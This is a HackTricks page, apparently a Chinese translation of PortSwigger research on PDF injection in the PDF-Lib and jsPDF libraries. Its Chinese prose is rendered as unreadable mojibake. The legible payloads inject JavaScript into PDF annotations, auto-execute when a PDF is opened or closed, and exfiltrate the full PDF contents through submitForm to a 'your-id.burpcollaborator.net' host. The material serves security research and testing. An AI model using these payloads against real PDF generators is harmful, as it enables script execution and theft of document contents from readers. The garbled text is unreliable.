<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆçš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å–[**å®˜æ–¹PEASSå’ŒHackTricksçš„è¡£ç‰©**](https://peass.creator-spring.com)

- **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>


**å¦‚æœä½ çš„è¾“å…¥è¢«åå°„åˆ°PDFæ–‡ä»¶ä¸­ï¼Œä½ å¯ä»¥å°è¯•æ³¨å…¥PDFæ•°æ®æ¥æ‰§è¡ŒJavaScriptæˆ–çªƒå–PDFå†…å®¹ã€‚**

ä»¥ä¸‹ä¿¡æ¯æ‘˜è‡ª[**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

è¿™æ¬¡ï¼Œæˆ‘ä½¿ç”¨äº†[PDFLib](https://pdf-lib.js.org)ã€‚æˆ‘èŠ±äº†ä¸€äº›æ—¶é—´ä½¿ç”¨è¯¥åº“åˆ›å»ºä¸€ä¸ªæ³¨é‡Šï¼Œå¹¶å°è¯•å°†ä¸€ä¸ªé—­åˆæ‹¬å·æ³¨å…¥åˆ°æ³¨é‡Šçš„URIä¸­ - ç»“æœæˆåŠŸäº†ï¼æˆ‘ç”¨æ¥ç”Ÿæˆæ³¨é‡Šä»£ç çš„æ ·æœ¬æ¼æ´ä»£ç å¦‚ä¸‹ï¼š

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[å®Œæ•´ä»£ç ï¼š](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

æˆ‘å¦‚ä½•çŸ¥é“æ³¨å…¥æˆåŠŸäº†å‘¢ï¼Ÿé™¤éæˆ‘æ³¨å…¥ä¸€ä¸ªé—­åˆæ‹¬å·ï¼Œå¦åˆ™PDFå°†æ­£ç¡®æ¸²æŸ“ã€‚è¿™è¯æ˜é—­åˆæ‹¬å·æ‰“ç ´äº†å­—ç¬¦ä¸²å¹¶å¯¼è‡´PDFä»£ç æ— æ•ˆã€‚ç ´åPDFå¾ˆå¥½ï¼Œä½†æˆ‘éœ€è¦ç¡®ä¿èƒ½å¤Ÿæ‰§è¡ŒJavaScriptã€‚æˆ‘æŸ¥çœ‹äº†æ¸²æŸ“åçš„PDFä»£ç ï¼Œå¹¶æ³¨æ„åˆ°è¾“å‡ºæ˜¯ä½¿ç”¨FlateDecodeè¿‡æ»¤å™¨è¿›è¡Œç¼–ç çš„ã€‚æˆ‘ç¼–å†™äº†ä¸€ä¸ªå°è„šæœ¬æ¥è§£å‹ç¼©è¯¥å—ï¼Œæ³¨é‡Šéƒ¨åˆ†çš„è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

æ­£å¦‚ä½ å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°çš„é‚£æ ·ï¼Œæ³¨å…¥å­—ç¬¦ä¸²ç”¨ä¸€ä¸ªé—­åˆæ‹¬å·å…³é—­äº†æ–‡æœ¬è¾¹ç•Œï¼Œç•™ä¸‹äº†ä¸€ä¸ªå·²å­˜åœ¨çš„é—­åˆæ‹¬å·ï¼Œå¯¼è‡´PDFæ¸²æŸ“ä¸æ­£ç¡®ï¼š

![æ˜¾ç¤ºåŠ è½½PDFæ—¶çš„é”™è¯¯å¯¹è¯æ¡†çš„å±å¹•æˆªå›¾](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

å¤ªå¥½äº†ï¼Œæˆ‘å¯ä»¥ç ´åPDFçš„æ¸²æŸ“ï¼Œæ¥ä¸‹æ¥å‘¢ï¼Ÿæˆ‘éœ€è¦æƒ³å‡ºä¸€ä¸ªè°ƒç”¨ä¸€äº›JavaScriptçš„æ³¨å…¥ - PDFæ³¨å…¥ä¸­çš„alert(1)ã€‚

å°±åƒXSSå‘é‡ä¾èµ–äºæµè§ˆå™¨çš„è§£æä¸€æ ·ï¼ŒPDFæ³¨å…¥çš„å¯åˆ©ç”¨æ€§å¯èƒ½å–å†³äºPDFæ¸²æŸ“å™¨ã€‚æˆ‘å†³å®šé¦–å…ˆé’ˆå¯¹Acrobatè¿›è¡Œæ”»å‡»ï¼Œå› ä¸ºæˆ‘è®¤ä¸ºè¿™äº›å‘é‡åœ¨Chromeä¸­çš„å¯è¡Œæ€§è¾ƒä½ã€‚æˆ‘æ³¨æ„åˆ°ä¸¤ä»¶äº‹ï¼š1ï¼‰ä½ å¯ä»¥æ³¨å…¥å…¶ä»–çš„æ³¨é‡Šæ“ä½œï¼Œ2ï¼‰å¦‚æœä½ ä¿®å¤ç°æœ‰çš„é—­åˆæ‹¬å·ï¼ŒPDFå°†ä¼šæ¸²æŸ“ã€‚ç»è¿‡ä¸€äº›å®éªŒï¼Œæˆ‘æƒ³å‡ºäº†ä¸€ä¸ªå¾ˆå¥½çš„æœ‰æ•ˆè´Ÿè½½ï¼Œå®ƒæ³¨å…¥äº†ä¸€ä¸ªé¢å¤–çš„æ³¨é‡Šæ“ä½œï¼Œæ‰§è¡Œäº†JavaScriptï¼Œå¹¶ä¿®å¤äº†é—­åˆæ‹¬å·ï¼š`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

é¦–å…ˆæ‰“ç ´æ‹¬å·ï¼Œç„¶åä½¿ç”¨>>æ‰“ç ´å­—å…¸ï¼Œç„¶åå¼€å§‹ä¸€ä¸ªæ–°çš„æ³¨é‡Šå­—å…¸ã€‚/S/JavaScriptä½¿æ³¨é‡ŠåŸºäºJavaScriptï¼Œ/JSæ˜¯å­˜å‚¨JavaScriptçš„åœ°æ–¹ã€‚æ‹¬å·å†…æ˜¯æˆ‘ä»¬å®é™…çš„JavaScriptä»£ç ã€‚è¯·æ³¨æ„ï¼Œå¦‚æœæ‹¬å·æ˜¯å¹³è¡¡çš„ï¼Œä½ ä¸éœ€è¦è½¬ä¹‰æ‹¬å·ã€‚æœ€åï¼Œæˆ‘æ·»åŠ äº†æ³¨é‡Šçš„ç±»å‹ï¼Œå®Œæˆäº†å­—å…¸ï¼Œå¹¶ä¿®å¤äº†é—­åˆæ‹¬å·ã€‚è¿™å¤ªé…·äº†ï¼Œæˆ‘å¯ä»¥åˆ¶ä½œä¸€ä¸ªæ‰§è¡ŒJavaScriptçš„æ³¨å…¥ï¼Œä½†é‚£åˆæ€æ ·å‘¢ï¼Ÿä½ å¯ä»¥æ‰§è¡ŒJavaScriptï¼Œä½†ä½ æ— æ³•è®¿é—®DOMï¼Œæ‰€ä»¥ä½ æ— æ³•è¯»å–cookieã€‚ç„¶åï¼ŒJameså‡ºç°äº†ï¼Œå¹¶å»ºè®®ä»æ³¨å…¥ä¸­çªƒå–PDFçš„å†…å®¹ã€‚æˆ‘å¼€å§‹å¯»æ‰¾è·å–PDFå†…å®¹çš„æ–¹æ³•ã€‚åœ¨Acrobatä¸­ï¼Œæˆ‘å‘ç°ä½ å¯ä»¥ä½¿ç”¨JavaScriptåœ¨æ²¡æœ‰ä»»ä½•ç”¨æˆ·äº¤äº’çš„æƒ…å†µä¸‹æäº¤è¡¨å•ï¼æŸ¥çœ‹JavaScript APIçš„è§„èŒƒï¼Œä¿®æ”¹åŸºæœ¬æ³¨å…¥å¹¶æ·»åŠ ä¸€äº›JavaScriptä»£ç ï¼Œå°†æ•´ä¸ªPDFä»£ç çš„å†…å®¹å‘é€åˆ°å¤–éƒ¨æœåŠ¡å™¨çš„POSTè¯·æ±‚ä¸­ï¼š`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

alertä¸æ˜¯å¿…éœ€çš„ï¼Œæˆ‘åªæ˜¯ä¸ºäº†è¯æ˜æ³¨å…¥æ­£åœ¨æ‰§è¡ŒJavaScriptã€‚

æ¥ä¸‹æ¥ï¼Œåªæ˜¯ä¸ºäº†å¥½ç©ï¼Œæˆ‘å°è¯•åœ¨ä¸ä½¿ç”¨JavaScriptçš„æƒ…å†µä¸‹çªƒå–PDFçš„å†…å®¹ã€‚ä»PDFè§„èŒƒä¸­ï¼Œæˆ‘å‘ç°å¯ä»¥ä½¿ç”¨ä¸€ä¸ªåä¸ºSubmitFormçš„æ“ä½œã€‚æˆ‘åœ¨è¿‡å»ä½¿ç”¨è¿‡è¿™ä¸ªæ“ä½œï¼Œå½“æˆ‘åœ¨Burp Suiteä¸­æ„å»ºä¸€ä¸ªç”¨äºæ‰«ææ£€æŸ¥çš„PDFæ—¶ã€‚å®ƒæ­£å¦‚å…¶åã€‚å®ƒè¿˜æœ‰ä¸€ä¸ªFlagså­—å…¸é¡¹æ¥æ§åˆ¶æäº¤çš„å†…å®¹ã€‚Flagså­—å…¸é”®æ¥å—ä¸€ä¸ªæ•´æ•°å€¼ï¼Œä½†æ¯ä¸ªå•ç‹¬çš„è®¾ç½®ç”±ä¸€ä¸ªäºŒè¿›åˆ¶ä½æ§åˆ¶ã€‚ä½¿ç”¨ES6ä¸­çš„æ–°äºŒè¿›åˆ¶å­—é¢é‡æ¥å¤„ç†è¿™äº›è®¾ç½®æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ–¹æ³•ã€‚äºŒè¿›åˆ¶å­—é¢é‡åº”è¯¥æœ‰14ä½ï¼Œå› ä¸ºæ€»å…±æœ‰14ä¸ªæ ‡å¿—ã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰è®¾ç½®éƒ½è¢«ç¦ç”¨ï¼š`0b00000000000000`

è¦è®¾ç½®ä¸€ä¸ªæ ‡å¿—ï¼Œé¦–å…ˆéœ€è¦æŸ¥æ‰¾å®ƒçš„ä½ä½ç½®ï¼ˆPDFè§„èŒƒçš„è¡¨237ï¼‰ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æƒ³è®¾ç½®SubmitPDFæ ‡å¿—ã€‚ç”±äºè¿™ç”±ç¬¬9ä½æ§åˆ¶ï¼Œæ‰€ä»¥ä½ åªéœ€è¦ä»å³è¾¹æ•°9ä½ï¼š`0b00000100000000`
å¦‚æœæ‚¨ä½¿ç”¨JavaScriptè¿›è¡Œè¯„ä¼°ï¼Œè¿™å°†å¯¼è‡´åè¿›åˆ¶å€¼256ã€‚æ¢å¥è¯è¯´ï¼Œå°†Flagsæ¡ç›®è®¾ç½®ä¸º256å°†å¯ç”¨SubmitPDFæ ‡å¿—ï¼Œè¿™ä¼šåœ¨æäº¤è¡¨å•æ—¶å‘é€PDFçš„å†…å®¹ã€‚æˆ‘ä»¬æ‰€éœ€è¦åšçš„å°±æ˜¯ä½¿ç”¨ä¹‹å‰åˆ›å»ºçš„åŸºæœ¬æ³¨å…¥ï¼Œå¹¶å°†å…¶ä¿®æ”¹ä¸ºè°ƒç”¨SubmitFormæ“ä½œè€Œä¸æ˜¯JavaScriptï¼š`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

æ¥ä¸‹æ¥ï¼Œæˆ‘å°†æˆ‘çš„æ–¹æ³•åº”ç”¨äºå¦ä¸€ä¸ªPDFåº“ - [jsPDF](https://parall.ax/products/jspdf) - å¹¶å‘ç°å®ƒä¹Ÿå­˜åœ¨æ¼æ´ã€‚åˆ©ç”¨è¿™ä¸ªåº“éå¸¸æœ‰è¶£ï¼Œå› ä¸ºå®ƒä»¬æœ‰ä¸€ä¸ªå¯ä»¥åœ¨æµè§ˆå™¨ä¸­æ‰§è¡Œå¹¶å…è®¸æ‚¨å®æ—¶ç”ŸæˆPDFçš„APIã€‚æˆ‘æ³¨æ„åˆ°ï¼Œä¸PDP-Libåº“ä¸€æ ·ï¼Œä»–ä»¬å¿˜è®°äº†åœ¨æ³¨é‡ŠURLä¸­è½¬ä¹‰æ‹¬å·ã€‚è¿™é‡Œçš„urlå±æ€§æ˜¯æœ‰æ¼æ´çš„ï¼š`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vulnerable`

å› æ­¤ï¼Œæˆ‘ä½¿ç”¨ä»–ä»¬çš„APIç”Ÿæˆäº†ä¸€ä¸ªPDFï¼Œå¹¶å°†PDFä»£ç æ³¨å…¥åˆ°urlå±æ€§ä¸­ï¼š

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

æˆ‘é€šè¿‡åˆ é™¤å­—å…¸çš„ç±»å‹æ¡ç›®å’Œä¸éœ€è¦çš„Fæ¡ç›®æ¥å‡å°‘äº†å‘é‡ã€‚ç„¶åï¼Œæˆ‘ç•™ä¸‹äº†ä¸€ä¸ªæ‚¬ç©ºçš„æ‹¬å·ï¼Œè¿™ä¸ªæ‹¬å·å°†ç”±ç°æœ‰çš„æ‹¬å·å…³é—­ã€‚å‡å°‘æ³¨å…¥çš„å¤§å°å¾ˆé‡è¦ï¼Œå› ä¸ºæ‚¨è¦æ³¨å…¥çš„Webåº”ç”¨ç¨‹åºå¯èƒ½åªå…è®¸æœ‰é™æ•°é‡çš„å­—ç¬¦ã€‚`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

ç„¶åï¼Œæˆ‘å‘ç°å¯ä»¥è¿›ä¸€æ­¥å‡å°‘å‘é‡ï¼Acrobatå…è®¸åœ¨ä¸€ä¸ªæ³¨é‡Šæ“ä½œä¸­åŒæ—¶ä½¿ç”¨URIå’ŒJavaScriptæ¡ç›®ï¼Œå¹¶ä¸”ä¼šæ„‰å¿«åœ°æ‰§è¡ŒJavaScriptï¼š`/)/S/JavaScript/JS(app.alert(1)`

è¿›ä¸€æ­¥çš„ç ”ç©¶æ­ç¤ºäº†æ‚¨è¿˜å¯ä»¥æ³¨å…¥å¤šä¸ªæ³¨é‡Šã€‚è¿™æ„å‘³ç€æ‚¨ä¸ä»…å¯ä»¥æ³¨å…¥ä¸€ä¸ªæ“ä½œï¼Œè¿˜å¯ä»¥è·³å‡ºæ³¨é‡Šå¹¶å®šä¹‰è‡ªå·±çš„çŸ©å½¢åæ ‡ï¼Œä»¥é€‰æ‹©æ–‡æ¡£çš„å“ªä¸ªéƒ¨åˆ†å¯ç‚¹å‡»ã€‚ä½¿ç”¨è¿™ç§æŠ€æœ¯ï¼Œæˆ‘èƒ½å¤Ÿä½¿æ•´ä¸ªæ–‡æ¡£å¯ç‚¹å‡»ã€‚`/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## åœ¨æ²¡æœ‰äº¤äº’çš„æƒ…å†µä¸‹æ‰§è¡Œæ³¨é‡Š

åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘æ¼”ç¤ºçš„å‘é‡éœ€è¦ç‚¹å‡»æ‰èƒ½æ¿€æ´»æ³¨é‡Šçš„æ“ä½œã€‚é€šå¸¸ï¼ŒJamesé—®äº†ä¸€ä¸ªé—®é¢˜ï¼šâ€œæˆ‘ä»¬èƒ½è‡ªåŠ¨æ‰§è¡Œå—ï¼Ÿâ€æˆ‘æŸ¥çœ‹äº†PDFè§„èŒƒï¼Œå¹¶æ³¨æ„åˆ°æ³¨é‡Šçš„ä¸€äº›æœ‰è¶£ç‰¹æ€§ï¼š

â€œ**PV**å’Œ**PI**æ¡ç›®å…è®¸åŒºåˆ†æ‰“å¼€çš„é¡µé¢å’Œå¯è§çš„é¡µé¢ã€‚åœ¨ä»»ä½•æ—¶å€™ï¼ŒæŸ¥çœ‹å™¨åº”ç”¨ç¨‹åºåªä¼šå°†ä¸€ä¸ªé¡µé¢è§†ä¸ºæ‰“å¼€çŠ¶æ€ï¼Œè€Œå¯ä»¥çœ‹åˆ°å¤šä¸ªé¡µé¢ï¼Œè¿™å–å†³äºé¡µé¢å¸ƒå±€ã€‚â€

æˆ‘ä»¬å¯ä»¥å‘å­—å…¸æ·»åŠ PVæ¡ç›®ï¼Œæ³¨é‡Šå°†è‡ªåŠ¨åœ¨Acrobatä¸Šè§¦å‘ï¼ä¸ä»…å¦‚æ­¤ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åœ¨å…³é—­PDFæ–‡æ¡£æ—¶è‡ªåŠ¨æ‰§è¡Œæœ‰æ•ˆè½½è·ï¼Œä½¿ç”¨PCæ¡ç›®ã€‚æ”»å‡»è€…å¯ä»¥åœ¨æ‚¨æ‰“å¼€å’Œå…³é—­PDFæ—¶è·Ÿè¸ªæ‚¨ã€‚

ä»¥ä¸‹æ˜¯å¦‚ä½•ä»æ³¨é‡Šä¸­è‡ªåŠ¨æ‰§è¡Œçš„æ–¹æ³•ï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

å½“æ‚¨å…³é—­PDFæ—¶ï¼Œæ­¤æ³¨é‡Šå°†è§¦å‘ï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

æˆ‘å·²ç»è°ˆäº†å¾ˆå¤šå…³äºAcrobatï¼Œä½†æ˜¯PDFiumï¼ˆChromeçš„PDFé˜…è¯»å™¨ï¼‰å‘¢ï¼ŸChromeå¾ˆæ£˜æ‰‹ï¼›æ”»å‡»é¢æ¯”Acrobatå°å¾—å¤šï¼Œå› ä¸ºå…¶JavaScriptæ”¯æŒæ¯”Acrobatæœ‰é™ã€‚æˆ‘é¦–å…ˆæ³¨æ„åˆ°çš„æ˜¯ï¼ŒJavaScriptæ ¹æœ¬ä¸ä¼šåœ¨æ³¨é‡Šä¸­æ‰§è¡Œï¼Œå› æ­¤æˆ‘çš„æ¦‚å¿µéªŒè¯æ— æ³•å·¥ä½œã€‚ä¸ºäº†ä½¿å‘é‡åœ¨Chromeä¸­èµ·ä½œç”¨ï¼Œæˆ‘è‡³å°‘éœ€è¦åœ¨æ³¨é‡Šä¸­æ‰§è¡ŒJavaScriptã€‚ä¸è¿‡ï¼Œé¦–å…ˆæˆ‘å†³å®šå°è¯•è¦†ç›–æ³¨é‡Šä¸­çš„URLã€‚è¿™å¾ˆå®¹æ˜“ã€‚æˆ‘å¯ä»¥ä½¿ç”¨ä¹‹å‰æå‡ºçš„åŸºæœ¬æ³¨å…¥ï¼Œå¹¶ç®€å•åœ°æ³¨å…¥å¦ä¸€ä¸ªå…·æœ‰URIæ¡ç›®çš„æ“ä½œï¼Œè¯¥æ¡ç›®å°†è¦†ç›–ç°æœ‰çš„URLï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

è¿™å°†åœ¨ç‚¹å‡»æ—¶å¯¼èˆªåˆ°portswigger.netã€‚ç„¶åï¼Œæˆ‘ç»§ç»­å°è¯•ä¸åŒçš„æ³¨å…¥æ–¹å¼æ¥è°ƒç”¨JavaScriptï¼Œä½†æ¯æ¬¡éƒ½å¤±è´¥äº†ã€‚æˆ‘è®¤ä¸ºè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚æˆ‘é€€åä¸€æ­¥ï¼Œå°è¯•æ‰‹åŠ¨æ„å»ºä¸€ä¸ªå®Œæ•´çš„PDFï¼Œä»¥ä¾¿åœ¨Chromeä¸­é€šè¿‡ç‚¹å‡»è€Œæ— éœ€æ³¨å…¥è°ƒç”¨JavaScriptã€‚å½“ä½¿ç”¨AcroFormæŒ‰é’®æ—¶ï¼ŒChromeå°†å…è®¸æ‰§è¡ŒJavaScriptï¼Œä½†é—®é¢˜æ˜¯å®ƒéœ€è¦å¼•ç”¨PDFçš„æŸäº›éƒ¨åˆ†ã€‚æˆ‘æˆåŠŸåœ°æ„å»ºäº†ä¸€ä¸ªæ³¨å…¥ï¼Œå®ƒå°†ä»JSPDFçš„ç‚¹å‡»ä¸­æ‰§è¡ŒJavaScriptï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`
å¦‚æ‚¨æ‰€è§ï¼Œä¸Šè¿°å‘é‡éœ€è¦äº†è§£PDFç»“æ„ã€‚\[ 3 0 R]æŒ‡çš„æ˜¯ç‰¹å®šçš„PDFå¯¹è±¡ï¼Œå¦‚æœæˆ‘ä»¬è¿›è¡Œç›²ç›®çš„PDFæ³¨å…¥æ”»å‡»ï¼Œæˆ‘ä»¬å°†ä¸çŸ¥é“å…¶ç»“æ„ã€‚ä¸è¿‡ï¼Œä¸‹ä¸€æ­¥æ˜¯å°è¯•è¡¨å•æäº¤ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨submitFormå‡½æ•°æ¥å®ç°ï¼Œå› ä¸ºæ³¨é‡Šéœ€è¦ç‚¹å‡»ï¼ŒChromeå°†å…è®¸å®ƒï¼š`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

è¿™æ ·å¯ä»¥å·¥ä½œï¼Œä½†æ˜¯ä»£ç å¾ˆä¹±ï¼Œéœ€è¦äº†è§£PDFç»“æ„ã€‚æˆ‘ä»¬å¯ä»¥å¤§å¤§ç®€åŒ–å®ƒï¼Œå¹¶æ¶ˆé™¤å¯¹PDFç»“æ„çš„ä¾èµ–ï¼š`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(`\
`app.alert(1)`\
`)/Type/Action/F 4/DA(blah`\
``

æˆ‘ä»¬è¿˜å¯ä»¥åˆ é™¤ä¸€äº›ä»£ç ï¼š`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>>>><</Type/Annot/Rect[ 0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(A)>>/A<</S/JavaScript/JS(app.alert(1))/(`});``\
`doc.text(20, 20, 'Test text');`\
``

ä¸Šé¢çš„ä»£ç è·³å‡ºäº†æ³¨é‡Šï¼Œåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„æ³¨é‡Šï¼Œå¹¶ä½¿æ•´ä¸ªé¡µé¢å¯ç‚¹å‡»ã€‚ä¸ºäº†æ‰§è¡ŒJavaScriptä»£ç ï¼Œæˆ‘ä»¬å¿…é¡»æ³¨å…¥ä¸€ä¸ªæŒ‰é’®ï¼Œå¹¶ä½¿ç”¨â€œTâ€æ¡ç›®ç»™å®ƒä»»æ„æ–‡æœ¬ã€‚ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å­—å…¸ä¸­çš„JSæ¡ç›®æœ€ç»ˆæ³¨å…¥æˆ‘ä»¬çš„JavaScriptä»£ç ã€‚åœ¨Chromeä¸Šæ‰§è¡ŒJavaScriptå¾ˆæ£’ã€‚å½“æˆ‘å¼€å§‹è¿™é¡¹ç ”ç©¶æ—¶ï¼Œæˆ‘ä»æœªæƒ³è¿‡è¿™æ˜¯å¯èƒ½çš„ã€‚

æ¥ä¸‹æ¥ï¼Œæˆ‘ç ”ç©¶äº†submitFormå‡½æ•°ä»¥çªƒå–PDFçš„å†…å®¹ã€‚æˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¯ä»¥è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¹¶ä¸”å®ƒä¼šä¸å¤–éƒ¨æœåŠ¡å™¨è”ç³»ï¼Œæ­£å¦‚ä¸Šé¢çš„ç¤ºä¾‹æ‰€ç¤ºï¼Œä½†å®ƒæ˜¯å¦æ”¯æŒå®Œæ•´çš„Acrobatè§„èŒƒå‘¢ï¼Ÿæˆ‘æŸ¥çœ‹äº†[PDFiumçš„æºä»£ç ](https://github.com/PDFium/PDFium/blob/master/fpdfsdk/src/javascript/Document.cpp#L818)ï¼Œä½†è¯¥å‡½æ•°ä¸æ”¯æŒSubmitAsPDF :( æ‚¨å¯ä»¥çœ‹åˆ°å®ƒæ”¯æŒFDFï¼Œä½†ä¸å¹¸çš„æ˜¯ï¼Œè¿™ä¸ä¼šæäº¤PDFçš„å†…å®¹ã€‚æˆ‘å¯»æ‰¾å…¶ä»–æ–¹æ³•ï¼Œä½†ä¸çŸ¥é“æœ‰å“ªäº›å¯ç”¨çš„å¯¹è±¡ã€‚æˆ‘é‡‡ç”¨äº†ä¸Acrobatç›¸åŒçš„æ–¹æ³•ï¼Œç¼–å†™äº†ä¸€ä¸ªæ¨¡ç³Šå™¨/æšä¸¾å™¨æ¥æŸ¥æ‰¾æœ‰è¶£çš„å¯¹è±¡ã€‚ä»Chromeä¸­è·å–ä¿¡æ¯æ¯”Acrobatæ›´å›°éš¾ï¼›æˆ‘å¿…é¡»åœ¨è¾“å‡ºä¹‹å‰ä»¥å—çš„å½¢å¼æ”¶é›†ä¿¡æ¯ï¼Œç„¶åä½¿ç”¨alertå‡½æ•°è¾“å‡ºå®ƒã€‚è¿™æ˜¯å› ä¸ºalertå‡½æ•°ä¼šæˆªæ–­å‘é€ç»™å®ƒçš„å­—ç¬¦ä¸²ã€‚`...`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`#)>> <</Type/Annot/Rect[0 0 900 900]/Subtype/Widget/Parent<</FT/Btn/T(a)>>/A<</S/JavaScript/JS(``\
`(function(){`\
`var obj = this,`\
`data = '',`\
`chunks = [],`\
`counter = 0,`\
`added = false, i, props = [];`\
`for(i in obj) {`\
`props.push(i);`\
`}`\
`...`

[å®Œæ•´ä»£ç ](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/jsPDF/chrome/enumerator/test.js)

